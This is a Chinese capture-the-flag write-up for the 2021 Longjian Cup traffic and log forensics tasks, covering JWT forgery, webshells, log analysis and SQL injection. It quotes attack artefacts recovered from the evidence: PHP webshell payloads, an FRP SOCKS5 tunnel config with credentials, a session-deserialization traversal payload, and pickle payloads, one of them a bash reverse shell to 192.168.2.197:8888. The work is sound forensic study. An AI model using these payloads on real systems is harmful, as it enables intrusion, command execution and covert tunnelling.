---
title: "陇剑杯2021wp"
date: 2025-04-20T21:27:10+08:00
summary: "陇剑杯2021wp"
url: "/posts/陇剑杯2021wp/"
categories:
  - "赛题wp"
tags:
  - "陇剑杯2021"
draft: false
---

# [陇剑杯 2021]签到

问题：此时正在进行的可能是______协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。得到的flag请使用NSSCTF{}格式提交。

解题：

用wireshark打开附件，因为是需要找什么协议的攻击，答案其实就那么几个，我们可以直接去**协议统计**那里看一下

![image-20250420120432855](image/image-20250420120432855.png)

查看通过协议分类的包，比起翻海量的包一个个看，统计结果更为明了

## 协议分级统计表

Wireshark 的 **协议分级统计表**（Protocol Hierarchy Statistics）是通过 **协议栈分层解析** 生成的，其分级逻辑遵循网络通信的 **OSI 模型** 或 **TCP/IP 协议栈**，从底层到上层逐层拆解数据包。

### **协议分级的核心逻辑**

#### **(1) 分层依据**

Wireshark 会按以下顺序解析每个数据包，并统计各层协议的占比：

```
1. **物理层**（如 Ethernet、Wi-Fi）  
2. **网络层**（如 IPv4/IPv6）  
3. **传输层**（如 TCP/UDP）  
4. **应用层**（如 HTTP/DNS/SMB）  
5. **载荷数据**（如 JSON/图片/加密流）
```

#### **(2) 统计规则**

- 按分组百分比

  ：统计某协议在所有数据包中出现的频率。

  - 例如：`TCP 占 99.45%` 表示 99.45% 的包包含 TCP 头。

- 按字节百分比

  ：统计某协议在所有字节中的占比（含下层协议头开销）。

  - 例如：`HTTP 占 56.3%` 表示 HTTP 及其载荷占总流量的 56.3%。

这里可以发现流量包主要是TCP协议，且应用层的协议主要是HTTP（HTTP的字节占比最大），因此判断是HTTP协议的攻击。

所以最终的flag

```
NSSTCTF{http}
```

# [陇剑杯 2021]jwt（问1）

问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：

该网站使用了______认证方式。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。

解题：

因为是网站的认证，所以我们尝试追踪HTTP流量

![image-20250420121659078](image/image-20250420121659078.png)

翻啊翻看到有token

![image-20250420121922165](image/image-20250420121922165.png)

```
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc
```

但是这个token怎么来的呢？我又去往上翻了一下

![image-20250420124424811](image/image-20250420124424811.png)

可以看到这里在传入用户名和身份参数之后服务器返回的响应包中就会产生一个token，也就是说这个其实就是基于token的登录验证，那么攻击者也就可以利用这个token去伪造身份尝试垂直越权登录

token的话通常是用base64进行编码的，我们拿去解码一下看看

![image-20250420122033001](image/image-20250420122033001.png)

可以看到是JWT认证，且整个token格式也满足JWT认证格式

### JWT认证格式

```
Header.Payload.Signature
```

所以最终的flag

```
NSSTCTF{jwt}
```

# [陇剑杯 2021]jwt（问2）

问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：
黑客绕过验证使用的jwt中，id和username是______。（中间使用#号隔开，例如1#admin）。得到的flag请使用NSSCTF{}格式提交。

解题：

因为这里是通过token中的jwt去认证的，如果需要绕过验证的话就是伪造token了，那我们直接用过滤器搜索带有token的流量包

```
http contains "token"
```

![image-20250420123348714](image/image-20250420123348714.png)

然后我们继续追踪HTTP流去分析他的流量包

![image-20250420123522964](image/image-20250420123522964.png)

根据jwt认证的格式，第二段就是我们的认证内容，也就是payload，拿去解密一下看看什么内容

![image-20250420123616710](image/image-20250420123616710.png)

id是10086，username是admin，但是答案不是这个，我们继续往下翻

![image-20250420123737308](image/image-20250420123737308.png)

这里看到攻击者执行了whoami的命令，此时的id和username也是10086#admin，但是响应包中显示没有权限，所以并没有绕过这个验证，但是此时我们知道攻击者会有习惯去执行whoami命令去检验身份，那我们可以直接搜索带有这个命令的流量包

![image-20250420124217931](image/image-20250420124217931.png)

此时就只剩下四个包了，那么就省去了很多工作

最终在第三个包下面发现了

![image-20250420124700809](image/image-20250420124700809.png)

返回了root，说明此时的身份就是root，也就是绕过了身份验证拿到root了，那我们把这个token拿去解码一下看看id和username就可以了

```
{"id":10087,"MapClaims":{"username":"admin"}}
```

所以flag就是

```
NSSCTF{10087#admin}
```

# [陇剑杯 2021]jwt（问3）

问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：
黑客获取webshell之后，权限是______？。得到的flag请使用NSSCTF{}格式提交。

其实上题就给出了答案，就是root权限，直接交就行

# [陇剑杯 2021]jwt（问4）

问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：
黑客上传的恶意文件文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。

解题：

既然是恶意上传的文件，那么请求包肯定是POST方法的，并且肯定是需要在绕过身份验证之后才能上传恶意文件的，那我们先找到刚刚的数据包并看看时间戳

![image-20250420130629320](image/image-20250420130629320.png)

就是选中的这个数据包，那我们继续往下翻找

![image-20250420130737697](image/image-20250420130737697.png)

可以看到这里攻击者在传入命令进行尝试

![image-20250420130919276](image/image-20250420130919276.png)

这里在base64解码之后用一个重定向符将内容写入/tmp/1.c中，我们看看这个恶意文件的内容是什么

![image-20250420131902239](image/image-20250420131902239.png)

在之后的请求包中就看到攻击者试图读取写入文件的内容，丢给ai分析一下

![image-20250420131504290](image/image-20250420131504290.png)

确定了这个就是恶意文件，所以最终的flag就是

```
NSSCTF{1.c}
```

# [陇剑杯 2021]jwt（问5）

问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：
黑客在服务器上编译的恶意so文件，文件名是_____________。(请提交带有文件后缀的文件名，例如x.so)。得到的flag请使用NSSCTF{}格式提交。

解题：

需要找到一个so文件，我们继续往下看一下

发现攻击者写入了一个makefile文件

![image-20250420132221427](image/image-20250420132221427.png)

这段代码是一个 **Makefile 片段**，用于编译生成一个名为 `looter.so` 的动态链接库（共享库），其源代码文件是 `looter.c`。

在之后的数据包中可以看到攻击者执行了make命令并且tmp目录下产生了一个so文件

![image-20250420132505048](image/image-20250420132505048.png)

![image-20250420132522172](image/image-20250420132522172.png)

所以这个looter.so可能就是攻击者在服务器上编译的恶意so文件，flag就是

# [陇剑杯 2021]jwt（问6）

问题：昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：
黑客在服务器上修改了一个配置文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF{}格式提交。

解题：

也是在拿到权限后进行的操作，沿着往下翻，发现了以下内容

![image-20250420133251989](image/image-20250420133251989.png)

![image-20250420133304245](image/image-20250420133304245.png)

所以这里修改的文件就是/etc/pam.d/common-auth，flag就是

```
NSSCTF{/etc/pam.d/common-auth}
```

# [陇剑杯 2021]webshell（问1）

问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：
黑客登录系统使用的密码是_____________。。得到的flag请使用NSSCTF{}格式提交。

解题：

因为是网站被挂马，所以我们分析HTTP流量就行，因为是在登录系统使用密码，所以一般来说是POST的方式传入登录密码，不过也有可能是GET啊，但是常规来说GET传入风险很大，所以往往都是POST表单输入

然后我们用过滤器查找POST请求的数据包

```
http.request.method == "POST"
```

然后看到一个数据包资源路径中有login

![image-20250420134055084](image/image-20250420134055084.png)

估计这里就是登录页面，然后看到在传入username和password后有unicode加密的msg回显，解密后是登录成功，猜测这里就是登录使用的密码了

```
NSSCTF{Admin123!@#}
```

# [陇剑杯 2021]webshell（问2）

问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：
黑客修改了一个日志文件，文件的绝对路径为_____________。（请确认绝对路径后再提交）。得到的flag请使用NSSCTF{}格式提交。

解题：

既然是修改了日志文件的话，肯定是在登录成功后才能进行的操作，所以我们在登录成功的数据包后面开始找就行（因为是修改文件，所以也是POST请求的）

![image-20250420140023904](image/image-20250420140023904.png)

这里看到了写入了一句话木马，但是回显404，估计是没写进去

![image-20250420140243039](image/image-20250420140243039.png)

这里的话是日志注入的方法，可以看到返回200，并且在后面几个请求包中分别执行了其他命令

![image-20250420140633249](image/image-20250420140633249.png)

说明修改的日志文件就是data/Runtime/Logs/Home/21_08_07.log，但是这里是相对路径，题目要求是绝对路径，因为是网站的日志文件，网站默认路径是/var/www/html，所以拼接一下就是绝对路径了，最终的flag就是

```
NSSCTF{/var/www/html/data/Runtime/Logs/Home/21_08_07.log}
```

或者往下翻可以看到一个数据包

![image-20250420140848136](image/image-20250420140848136.png)

这里通过命令写入文件，文件的绝对路径就是/var/www/html，结合网站的日志文件的相对路径拼接就是日志文件的绝对路径了

# [陇剑杯 2021]webshell（问3）

问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：
黑客获取webshell之后，权限是______？得到的flag请使用NSSCTF{}格式提交。

解题：

我们先看看上面一题的最后的数据包中写入1.php文件的内容

![image-20250420141112441](image/image-20250420141112441.png)

经典的一句话木马

因为上传木马的操作是成功了的，那么此时就是获取到了webshell权限，那么就可以通过利用木马去执行操作，所以我们用过滤器

```
http contains "1.php"
```

![image-20250420141349947](image/image-20250420141349947.png)

筛选出来后慢慢翻一下

![image-20250420141538757](image/image-20250420141538757.png)

看到对aaa传入了大量字符，我们解析一下

```
<?php
// 关闭PHP错误显示，防止攻击者看到错误信息（@符号抑制错误提示）
@ini_set("display_errors", "0");

// 设置脚本最大执行时间为无限制（0表示不超时）
@set_time_limit(0);

// 定义一个伪装的"加密"函数，实际直接返回原内容（用于混淆安全检测）
function asenc($out){return $out;}

// 定义输出处理函数（用于隐蔽传输数据）
function asoutput(){
    // 获取输出缓冲区中的内容
    $output=ob_get_contents();
    
    // 清空并关闭输出缓冲区
    ob_end_clean();
    
    // 输出固定的混淆前缀字符串（干扰安全设备检测）
    echo "bc"."0f2";
    
    // 输出经过"加密"处理的内容（实际未加密）
    echo @asenc($output);
    
    // 输出固定的混淆后缀字符串（干扰安全设备检测）
    echo "f797e"."322e0";
}

// 开启输出缓冲，用于捕获后续所有输出内容
ob_start();

try{
    // 获取当前执行脚本的绝对路径所在目录
    $D=dirname($_SERVER["SCRIPT_FILENAME"]);
    
    // 如果获取失败，尝试通过PATH_TRANSLATED获取（IIS服务器备用方案）
    if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);
    
    // 初始化结果字符串，包含目录路径和制表符分隔符
    $R="{$D}\t";
    
    // 判断操作系统类型：检查路径是否以/开头（Linux/Unix系统）
    if(substr($D,0,1)!="/"){
        // Windows系统：遍历所有可能的盘符（C到Z）
        foreach(range("C","Z") as $L)
            // 检查该盘符是否存在
            if(is_dir("{$L}:"))
                // 将存在的盘符追加到结果字符串
                $R.="{$L}:";
    }else{
        // Linux系统：直接追加根目录标识
        $R.="/";
    }
    
    // 追加制表符分隔符
    $R.="\t";
    
    // 尝试获取当前进程的用户信息（如果POSIX函数可用）
    $u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
    
    // 获取用户名：优先使用POSIX获取的用户名，否则使用PHP当前用户
    $s=($u)?$u["name"]:@get_current_user();
    
    // 追加操作系统详细信息（包括系统类型、主机名、内核版本等）
    $R.=php_uname();
    
    // 追加当前用户名并用制表符分隔
    $R.="\t{$s}";
    
    // 输出收集到的所有系统信息
    echo $R;
    
}catch(Exception $e){
    // 如果发生异常，输出错误信息（前缀带ERROR://标识）
    echo "ERROR://".$e->getMessage();
}

// 调用输出处理函数（添加混淆字符）
asoutput();

// 立即终止脚本执行
die();

```

这个脚本的话其实就是获取一些服务器的基本信息并做了一些隐藏的功能

![image-20250420142134039](image/image-20250420142134039.png)

可以看到回显了当前用户的信息就是www-data，这是常见的用户名，直接提交就行

```
NSSCTF{www-data}
```

不过我这个估计不是常规解啊，预期解是通过搜查whoami命令去查看

![image-20250420142640157](image/image-20250420142640157.png)

第二条

![image-20250420142656550](image/image-20250420142656550.png)

# [陇剑杯 2021]webshell（问4）

问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：
黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。

解题：

这个在上面就看到了，是1.php文件，所以flag就是

```
NSSCTF{1.php}
```

# [陇剑杯 2021]webshell（问5）

问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：
黑客上传的代理工具客户端名字是_____________。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。

解题：上传文件的话，首要的还是搜查POST请求的数据包

在第37个流和第39个流中

![image-20250420143556011](image/image-20250420143556011.png)

![image-20250420143606262](image/image-20250420143606262.png)

都是执行了查看目录文件的命令，但是后者多出了一个frpc.ini，那么问题就出现在第38个流中

![image-20250420143715005](image/image-20250420143715005.png)

分析一下代码

```php
aaa=@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "28"."f72";echo @asenc($output);echo "f486"."11f4";}ob_start();try{$f=base64_decode(substr($_POST["j68071301598f"],2));$c=$_POST["xa5d606e67883a"];$c=str_replace("\r","",$c);$c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));echo(@fwrite(fopen($f,"a"),$buf)?"1":"0");;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();
&j68071301598f=FBL3Zhci93d3cvaHRtbC9mcnBjLmluaQ==&xa5d606e67883a=5B636F6D6D6F6E5D0A7365727665725F61646472203D203139322E3136382E3233392E3132330A7365727665725F706F7274203D20373737380A746F6B656E3D586133424A66326C35656E6D4E365A3741386D760A0A5B746573745F736F636B355D0A74797065203D207463700A72656D6F74655F706F7274203D383131310A706C7567696E203D20736F636B73350A706C7567696E5F75736572203D2030484446743136634C514A0A706C7567696E5F706173737764203D204A544E32373647700A7573655F656E6372797074696F6E203D20747275650A7573655F636F6D7072657373696F6E203D20747275650A
```

这里有两个参数，&j68071301598f=FBL3Zhci93d3cvaHRtbC9mcnBjLmluaQ==的值拿去解码可以得到一个文件路径（需要去掉前两个字符）

![image-20250420144132846](image/image-20250420144132846.png)

然后我们看看主要攻击逻辑

```
$f = base64_decode(substr($_POST["j68071301598f"],2));  // 解码目标文件路径
$c = $_POST["xa5d606e67883a"];                         // 获取十六进制数据
$c = str_replace("\r\n", "", $c);                       // 清理换行符
$buf = "";
// 十六进制转原始数据（每2字符为一组，添加%后URL解码）
for($i=0; $i<strlen($c); $i+=2) {
    $buf .= urldecode("%".substr($c, $i, 2));
}
// 追加写入文件，返回1（成功）或0（失败）
echo @fwrite(fopen($f, "a"), $buf) ? "1" : "0";

```

所以第二个参数的值就是需要写入/var/www/html/frpc.ini的文件内容，我们解码看看文件内容

```
[common]
server_addr = 192.168.239.123  # 攻击者控制的FRP服务端IP
server_port = 7778              # 服务端端口
token = Xa3BJf2l5enmN6Z7A8mv    # 认证令牌

[test_sock5]
type = tcp                      # 代理类型为TCP
remote_port = 8111              # 暴露在公网的端口
plugin = socks5                 # 插件类型（SOCKS5代理）
plugin_user = 0HDFt16cLQJ       # 代理用户名
plugin_passwd = JTN276Gp        # 代理密码
use_encryption = true           # 启用加密
use_compression = true          # 启用压缩
```

就是设置反向代理搭建隧道的一个配置文件，通过FRP建立反向代理隧道，将受害服务器变成SOCKS5代理

那么代理工具名字就是frpc

```
NSSCTF{frpc}
```

# [陇剑杯 2021]webshell（问6）

问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：
黑客代理工具的回连服务端IP是_____________。得到的flag请使用NSSCTF{}格式提交。

解题：

需要找到回连服务端ip，首先得知道什么是回连服务端IP

## 回连服务端IP是什么

**回连服务端IP**（也称为 **C2（Command & Control）服务器IP**）是黑客控制的远程服务器地址，用于与被入侵的计算机（受害机）建立隐蔽通信通道，从而远程操控目标设备。

黑客在攻击过程中，通常需要让受害机（被入侵的服务器/主机）主动连接自己的服务器，而不是直接攻击目标（因为防火墙会拦截外部攻击）。这种方式称为 **反向连接（Reverse Connection）**，因为反向代理的话是受害机器去连接攻击机，所以这里就是回连，那服务端也就是我们的攻击机，上一题的配置文件内容中已经提到了攻击机的ip，直接交就是

```
NSSCTF{192.168.239.123}
```

# [陇剑杯 2021]webshell（问7）

问题：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：
黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。得到的flag请使用NSSCTF{}格式提交。

解题：这个在配置文件中也是有的

```
NSSCTF{0HDFt16cLQJ#JTN276Gp}
```

# [陇剑杯 2021]日志分析（问1）

问题：单位某应用程序被攻击，请分析日志，进行作答：
网络存在源码泄漏，源码文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)。得到的flag请使用NSSCTF{}格式提交。

解题：

先看看日志文件的构成吧

日志文件的结构

```
[客户端IP] - [用户名] [时间戳] "[请求方法] [URL] [协议]" [状态码] [响应大小] "[来源页]" "[User-Agent]"
```

然后在日志文件中可以看到似乎攻击者是做了一个目录扫描的操作

![image-20250420145657704](image/image-20250420145657704.png)

例如这里200状态码说明该路径是存在的，那我们翻找一下是否存在源码泄露，源码泄露的方式无疑就几种，.git源码泄露，SVN泄露，www.zip压缩文件等，继续往下翻就可以看到

![image-20250420150025787](image/image-20250420150025787.png)

存在www.zip备份文件，估计就是源码泄露文件了，拿去提交就行

```
NSSCTF{www.zip}
```

# [陇剑杯 2021]日志分析（问2）

问题：单位某应用程序被攻击，请分析日志，进行作答：
分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。得到的flag请使用NSSCTF{}格式提交。

解题：

既然是tmp目录中的，那么日志中的数据肯定会包含tmp字样，直接搜就有

```
172.17.0.1 - - [07/Aug/2021:01:38:20 +0000] "GET /?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D HTTP/1.1" 302 879 "-" "python-requests/2.26.0"

172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] "GET /?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D HTTP/1.1" 302 879 "-" "python-requests/2.26.0"

```

有url编码，拿去解码一下

```
172.17.0.1 - - [07/Aug/2021:01:38:20 +0000] "GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&content=func|N;files|a:2:{s:8:"filename";s:16:"./files/filename";s:20:"call_user_func_array";s:28:"./files/call_user_func_array";}paths|a:1:{s:5:"/flag";s:13:"SplFileObject";} HTTP/1.1" 302 879 "-" "python-requests/2.26.0"

172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] "GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&content=func|N;files|a:2:{s:8:"filename";s:16:"./files/filename";s:20:"call_user_func_array";s:28:"./files/call_user_func_array";}paths|a:1:{s:5:"/flag";s:13:"SplFileObject";} HTTP/1.1" 302 879 "-" "python-requests/2.26.0"
```

很经典的session反序列化，那么这里的话文件名就显而易见了

```
NSSCTF{sess_car}
```

# [陇剑杯 2021]日志分析（问3）

问题：单位某应用程序被攻击，请分析日志，进行作答：
分析攻击流量，黑客使用的是______类读取了秘密文件。得到的flag请使用NSSCTF{}格式提交。

解题：也是在上面一题的payload中，了解一下这段payload就明白了，这里是使用 `SplFileObject` 内置类去读取敏感文件（如 `/flag`）。

```
NSSCTF{SplFileObject}
```

# [陇剑杯 2021]SQL注入（问1）

问题：某应用程序被攻击，请分析日志后作答：
黑客在注入过程中采用的注入手法叫_____________。（格式为4个汉字，例如“拼搏努力”）。得到的flag请使用NSSCTF{}格式提交。

解题：先打开日志文件看一下

![image-20250420201730603](image/image-20250420201730603.png)

然后翻看了一下啊，基本上都是一种注入手法那就是布尔盲注

```
NSSCTF{布尔盲注}
```

# [陇剑杯 2021]SQL注入（问2）

问题：某应用程序被攻击，请分析日志后作答：
黑客在注入过程中，最终获取flag的数据库名、表名和字段名是_____________。（格式为“数据库名#表名#字段名”，例如database#table#column）。得到的flag请使用NSSCTF{}格式提交。

解题：熟悉sql注入的都知道，在进行常规注入的时候都会用到库名，表名和字段名，直接搜就行

```
table_schema
```

![image-20250420202235408](image/image-20250420202235408.png)

![image-20250420202355254](image/image-20250420202355254.png)

![image-20250420202435789](image/image-20250420202435789.png)

因为常规注入的时候会用where语句去指定数据库或者数据表，所以直接搜就行

```
数据库名：sqli
数据表名：flag
字段名：flag
```

拿去交就行

```
NSSCTF{sqli#flag#flag}
```

# [陇剑杯 2021]SQL注入（问3）

问题：某应用程序被攻击，请分析日志后作答：
黑客最后获取到的flag字符串为_____________。得到的flag请使用NSSCTF{}格式提交。

解题：

那就是爆数据了，那我们从这里开始找

![image-20250420202927781](image/image-20250420202927781.png)

因为之前我们有了解到，在每条数据中都会有响应大小的字样，也就是类似429，425，424等就是响应大小，那么我们可以根据这个去潘判断字符判断是否正确，因为这里用了if语句，条件满足的情况只有一种，那我们中响应大小跟其他的相差很大的就是正确的了

![image-20250420203241730](image/image-20250420203241730.png)

这个明显差别很大，并且字符在我们预料之内，我们可以写脚本这样可以更快一点检索出来

```python
import re
import urllib.parse

arr = []
with open(r"access.log", 'r') as f:
    pattern = r'sqli\.flag\),(\d+).+\'(.+)\''
    for i in f:
        m = re.search(pattern, i)
        if m:
            #print(i)
            arr.append(m.group(1, 2))
            #print(m.group(1, 2))
for i in range(len(arr) - 1):
    if arr[i][0] != arr[i + 1][0]:
        if '%' in arr[i][1]:
            print(urllib.parse.unquote(arr[i][1]), end='')
        else:
            print(arr[i][1], end='')

```

```
flag{deddcd67-bcfd-487e-b940-1217e668c7db}
```

这里的话其实第一个就是捕获所有的爆数据的查询语句，第二个就是一个很好的思路

假设我们

```
arr = [('1','a'), ('1','b'), ('2','x')]
```

如果查询语句执行

```
1 and if(substr((select flag from sqli.flag),1,1) = 'b',1,(select table_name from information_schema.tables))
```

如果b是对的，那么就不会再使用`substr((select flag from sqli.flag),1,1)`，而是转向第二个字符进行注入

```
1 and if(substr((select flag from sqli.flag),2,1) = 'x',1,(select table_name from information_schema.tables))
```

所以

```
若i=0，arr[0][0] = '1'，arr[1][0] = '1' → 不满足条件，跳过。
若i=1，arr[1][0] = '1'，arr[2][0] = '2' -> 满足条件，打印出来
```

然后最终的flag就是

```
NSSCTF{deddcd67-bcfd-487e-b940-1217e668c7db}
```

# [陇剑杯 2021]简单日志分析（问1）

问题：某应用程序被攻击，请分析日志后作答：
黑客攻击的参数是______。（如有字母请全部使用小写）。得到的flag请使用NSSCTF{}格式提交。

解题：

打开看到一堆404，猜测是在扫描目录，然后发现一个user参数

![image-20250420211504918](image/image-20250420211504918.png)

![image-20250420211635926](image/image-20250420211635926.png)

有点像pickle反序列化，但是user参数肯定是对的

```
NSSCTF{user}
```

# [陇剑杯 2021]简单日志分析（问2）

问题：某应用程序被攻击，请分析日志后作答：
黑客查看的秘密文件的绝对路径是_____________。得到的flag请使用NSSCTF{}格式提交。

解题：

全部看完了一共三个对user参数的操作

```
127.0.0.1 - - [07/Aug/2021 10:43:12] "GET /?user=STAKcDAKMFMnd2hvYW1pJwpwMQowKGcwCmxwMgowKEkwCnRwMwowKGczCkkwCmRwNAowY29zCnN5c3RlbQpwNQowZzUKKGcxCnRSLg== HTTP/1.1" 500 -
127.0.0.1 - - [07/Aug/2021 10:43:12] "GET /?user=STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP/1.1" 500 -
127.0.0.1 - - [07/Aug/2021 10:43:12] "GET /?user=STAKcDAKMFMnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjIuMTk3Lzg4ODggMD4mMScKcDEKMChnMApscDIKMChJMAp0cDMKMChnMwpJMApkcDQKMGNvcwpzeXN0ZW0KcDUKMGc1CihnMQp0Ui4= HTTP/1.1" 500 -
```

这三个payload拿去解码一下

```
I0
p0
0S'whoami'
p1
0(g0
lp2
0(I0
tp3
0(g3
I0
dp4
0cos
system
p5
0g5
(g1
tR.
```

```
I0
p0
0S'cat /Th4s_IS_VERY_Import_Fi1e'
p1
0(g0
lp2
0(I0
tp3
0(g3
I0
dp4
0cos
system
p5
0g5
(g1
tR.
```

```
I0
p0
0S'bash -i >& /dev/tcp/192.168.2.197/8888 0>&1'
p1
0(g0
lp2
0(I0
tp3
0(g3
I0
dp4
0cos
system
p5
0g5
(g1
tR.
```

到第二个就可以看到他在执行的操作了

```
os.system('cat /Th4s_IS_VERY_Import_Fi1e')
```

那文件的绝对路径就有了

```
NSSCTF{/Th4s_IS_VERY_Import_Fi1e}
```

# [陇剑杯 2021]简单日志分析（问3）

问题：某应用程序被攻击，请分析日志后作答：
黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口"，例如127.0.0.1:2333）。得到的flag请使用NSSCTF{}格式提交。

解题：

在上面第三个payload中就可以看到反弹shell的操作了

```
bash -i >& /dev/tcp/192.168.2.197/8888 0>&1
```

```
NSSCTF{192.168.2.197:8888}
```
